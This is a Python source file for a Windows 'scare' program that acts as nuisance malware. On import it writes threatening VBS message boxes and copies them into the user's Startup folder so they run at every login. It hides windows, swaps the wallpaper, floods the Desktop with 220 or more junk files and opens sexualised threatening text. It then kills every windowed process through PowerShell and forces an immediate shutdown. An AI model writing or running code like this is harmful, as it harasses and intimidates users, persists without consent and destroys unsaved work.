from logging import shutdown
import os
import shutil
import ctypes
import threading
import win32api
import playsound
import win32gui, win32con
from threading import Thread
import time
from cryptography.fernet import Fernet
from gtts import gTTS
import cv2
import getpass
import subprocess

class GetCurrentPath:
    current_path = os.getcwd()

class AddToStartup:
    BOX = ['x=msgbox("YOU ARE STILL MINE" ,48, "NO RUN AWAY..")','x=msgbox("I WILL EAT YOU ALIVE" ,2, "WHILE YOU SLEEP")']
    tocopy = ["sysinfo.vbs","system32.vbs"]
    with open(file=tocopy[0],mode="a") as msgbox2:
        msgbox2.write(BOX[0])
        msgbox2.close()
    with open(file=tocopy[1],mode="a") as msgbox2:
        msgbox2.write(BOX[1])
        msgbox2.close()
    USER_NAME = getpass.getuser()
    file_path = (r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME)
    shutil.copy2(tocopy[0],file_path)
    shutil.copy2(tocopy[1],file_path)

class ChangeBackground:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/bgphoto.jpg" , 0)

class PlayMusic:
    kill = False
    MusicLoop = True
    def musicloop():
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
        while PlayMusic.MusicLoop:
            playsound.playsound(f"{GetCurrentPath.current_path}/bgmusic.mp3")

threading.Thread(target=PlayMusic.musicloop).start()

class WebPageOpen:
    os.system("START http://973-eht-namuh-973.com/coloured%20site/start/i_thought/1.htm")


class MarryMe:
    INFILETEXT = "DO NOT LOOK BEHIND YOU ;)"
    item_names = ["MARRYME","ISEEYOU","SCARY","EYE","BLOOD","KILL","DEATH","ESCAPE","OVER","FIRE","BURNTODEATH","ONECUP","DIE","ONEHAMMER","ONEGUY","BOY","CREEP","NOWAYTORUN","RUN","BEHINDYOU","I AM BEHIND YOU","I AM WATCHING YOU"," THERE IS NO WAY TO RUN","DO NOT RUN AWAY","YOUR SOUL IS MINE"]
    NAME = getpass.getuser()
    desktop = (r"C:\Users\%s\Desktop" % NAME)
    for item in item_names:
        folder_path = os.path.join(desktop, item)
        with open(file=f"{folder_path}.BAS",mode="a") as create:
            create.write(f"{INFILETEXT}")
            create.close()
    time.sleep(10)
    ENJOYTEXT = "PLEASE MARRY ME. I WANT TO FEEL YOU. I WANT TO TASTE YOU.\nhttps://memegenerator.net/img/instances/25169849/watch-out-someones-behind-you.jpg"
    with open(file="ENJOY.txt", mode="a") as openme:
        openme.write(ENJOYTEXT)
        openme.close()
    os.system(f"START {GetCurrentPath.current_path}/ENJOY.txt")
    time.sleep(12)
    os.system("START https://www.google.com/search?q=creepypasta+photos&tbm=isch&ved=2ahUKEwiHzoSumqr0AhXn2rsIHdj_DlEQ2-cCegQIABAA&oq=creepypasta+photos&gs_lcp=CgNpbWcQAzIECAAQEzIECAAQEzIICAAQBRAeEBMyCAgAEAUQHhATOgcIIxDvAxAnOgUIABCABDoECAAQQzoICAAQCBAeEBM6BggAEB4QE1DSBFjsCmD5C2gAcAB4AIABnQGIAakGkgEDNS4zmAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=H6CaYcdC57Xv9Q_Y_7uIBQ&bih=722&biw=1536")

class Sounds:
    time.sleep(5)
    message = "Do not look behind you."
    language = "en"

    obj=gTTS(text=message,lang=language,slow=True)
    obj.save(f"{GetCurrentPath.current_path}/run.mp3")
    os.system(f"START {GetCurrentPath.current_path}/run.mp3")

class PlayVideo:
    time.sleep(10)
    file_name = f"{GetCurrentPath.current_path}/dinnertrim.mp4"
    window_name = "YOU ARE BEING WATCHED"
    interframe_wait_ms = 30

    cap = cv2.VideoCapture(file_name)
    if not cap.isOpened():
        print("Error: Could not open video.")
        exit()

    cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while (True):
        ret, frame = cap.read()
        if not ret:
            print("Reached end of video, exiting.")
            break

        cv2.imshow(window_name, frame)
        if cv2.waitKey(interframe_wait_ms) & 0x7F == ord('q'):
            print("Exit requested.")
            break

    cap.release()
    cv2.destroyAllWindows()

class MessageBox:
    MSGBOX_WARNING = ['x=msgbox("SOMEONE IS WATCHING YOU" ,48, "DONT LOOK BEHIND YOU")','x=msgbox("I AM HAVING FUN.." ,16, "HA HA HA")']
    with open(file="msgbox.vbs",mode="a") as msgbox:
        msgbox.write(MSGBOX_WARNING[0])
        msgbox.close()
    with open(file="msgbox2.vbs",mode="a") as msgbox2:
        msgbox2.write(MSGBOX_WARNING[1])
        msgbox2.close()
    os.system(f"START {GetCurrentPath.current_path}/msgbox.vbs")
    time.sleep(3)
    os.system(f"START {GetCurrentPath.current_path}/msgbox2.vbs")

class ChangeWallpaper2:
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/you.jpg" , 0)

class Animation:
    Twinkle = True
    player = os.system(f"START {GetCurrentPath.current_path}/twinkleaudio.mp3")

class AnimateVideo:
    file_name = f"{GetCurrentPath.current_path}/NotepadNew.mp4"
    window_name = "YOU ARE BEING WATCHED"
    interframe_wait_ms = 1

    cap = cv2.VideoCapture(file_name)
    if not cap.isOpened():
        print("Error: Could not open video.")
        exit()

    cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while (True):
        ret, frame = cap.read()
        if not ret:
            print("Reached end of video, exiting.")
            break

        cv2.imshow(window_name, frame)
        if cv2.waitKey(interframe_wait_ms) & 0x7F == ord('q'):
            print("Exit requested.")
            break

    cap.release()
    cv2.destroyAllWindows()

class KillAllWindows:
    COMMAND = """(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process;"""
    subprocess.run(['powershell', '-command', COMMAND], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

#BACKGROUND ANIMATIONS
class AnimatedBG:
    time.sleep(2)
    listAnimations = ["a1","a2","a3","a4","a5","a6","a7","a8","a9","a10","a11","a12","a13","a14","a15","a16","a17","a18","a19","a20","a21","a22","a23","a24","a25","a26","a27","a28","a29","a30","a31","a32","a33","a34","a35"]
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[0]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[1]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[2]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[3]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[4]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[5]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[6]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[7]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[8]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[9]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[10]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[11]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[12]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[13]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[14]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[15]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[16]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[17]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[18]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[19]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[20]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[21]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[22]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[23]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[24]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[25]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[26]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[27]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[28]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[29]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[30]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[31]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[32]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[33]}.png" , 0)
    time.sleep(3)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{GetCurrentPath.current_path}/imgs/{listAnimations[34]}.png" , 0)
    time.sleep(3)
    
class End:
    NAME = getpass.getuser()
    desktop = (r"C:\Users\%s\Desktop" % NAME)
    i = 1
    for s in range(220):
        new_folder = "👿இந்தி网络†平仮名漢字👿"+str(i)
        folder_path = os.path.join(desktop, new_folder)
        with open(f"{folder_path}.bin",mode="a") as f:
            f.write("†SATAN IS RIGHT HERE†")
            f.close()
        i += 1
    os.system("shutdown /s /f /t 00")